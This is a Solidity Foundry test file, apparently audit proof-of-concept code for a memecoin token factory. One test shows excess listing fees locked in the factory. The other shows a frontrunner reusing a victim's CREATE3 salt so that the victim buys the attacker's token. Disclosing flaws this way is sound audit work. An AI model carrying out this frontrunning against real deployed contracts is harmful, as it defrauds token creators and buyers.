// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Base, BuzzToken, ICREATE3Factory} from "../Base.t.sol";

contract POC is Base {
    function test_poc_excess_native_token_not_reembursed() public {
        // Get the cost of the listing fee in the native token.
        uint256 listingFee = feeManager.listingFee();

        // Give twice the amount of the listing fee to the user.
        deal(_USER, listingFee * 2);

        // Create a new token via the factory.
        string[2] memory metadata;
        metadata[0] = "Memecoin";
        metadata[1] = "MEME";

        address[2] memory addr;
        addr[0] = address(wBERA);
        addr[1] = address(buzzVaultExponential);

        uint256[2] memory raiseData;
        raiseData[0] = 1e18;
        raiseData[1] = 1000e18;

        vm.prank(_USER);
        buzzTokenFactory.createToken{value: listingFee * 2}(metadata, addr, raiseData, 0, keccak256("MEME"));

        // Assert that the amount sent in excess is not reembursed.
        assertEq(_USER.balance, 0);

        // Assert that the treasury has only received the listing fee.
        assertEq(address(_TREASURY).balance, listingFee);

        // Assert that the remaning amount is locked in the factory forever.
        assertEq(address(buzzTokenFactory).balance, listingFee);
    }

    function test_poc_frontrunning_token_creation() public {
        // Give BERA to pay for the listing fee to both Alice and Bob.
        uint256 listingFee = feeManager.listingFee();
        deal(_ALICE, listingFee);
        deal(_BOB, listingFee);

        // Give NECT to Alice for her to perform the first buy of the token she wants to create.
        uint256 buyAmount = 100e18;
        deal(address(NECT), _ALICE, buyAmount);

        // Alice approves the buzz vault exponential to spend NECT.
        vm.prank(_ALICE);
        NECT.approve(address(buzzVaultExponential), buyAmount);

        // Alice precomputes the address of the token that she will create.
        address aliceToken =
            ICREATE3Factory(_CREATE3_DEPLOYER).getDeployed(address(buzzTokenFactory), keccak256("0x1337"));

        // Bob frontruns Alice and creates a new token with the same base token and salt as Alice.
        // Bob also uses the same initial and final reserve amounts as Alice to make sure that her
        // transaction does not revert due to slippage protection.
        string[2] memory metadata;
        metadata[0] = "Bob Memecoin";
        metadata[1] = "BOBMEME";

        address[2] memory addr;
        addr[0] = address(NECT);
        addr[1] = address(buzzVaultExponential);

        uint256[2] memory raise;
        raise[0] = 1e18;
        raise[1] = 1000e18;

        vm.prank(_BOB);
        address bobToken =
            buzzTokenFactory.createToken{value: listingFee}(metadata, addr, raise, 0, keccak256("0x1337"));

        // Alice's transaction to create a new token will revert because a token is already deployed at
        // the pre-computed address she was expecting to deploy her token.
        metadata[0] = "Alice Memecoin";
        metadata[1] = "ALICEMEME";

        addr[0] = address(NECT);
        addr[1] = address(buzzVaultExponential);

        raise[0] = 1e18;
        raise[1] = 1000e18;

        vm.prank(_ALICE);
        vm.expectRevert();
        buzzTokenFactory.createToken{value: listingFee}(metadata, addr, raise, buyAmount, keccak256("0x1337"));

        // Alice's initial buy will go through.
        uint256 quote = buzzVaultExponential.quote(aliceToken, buyAmount, true);
        vm.prank(_ALICE);
        buzzVaultExponential.buy(aliceToken, buyAmount, quote, address(0), _ALICE);

        // Assert that by frontrunning Alice's transaction, Bob's newly created token has the
        // same address as the one Alice was expecting to create.
        assertEq(bobToken, aliceToken);

        // Assert that the token alice thought she was creating is actually Bob's token.
        assertEq(BuzzToken(aliceToken).name(), "Bob Memecoin");
        assertEq(BuzzToken(aliceToken).symbol(), "BOBMEME");

        // Assert that Alice's buy went through and she bought Bob's token.
        assertEq(BuzzToken(aliceToken).balanceOf(_ALICE), quote);
    }
}
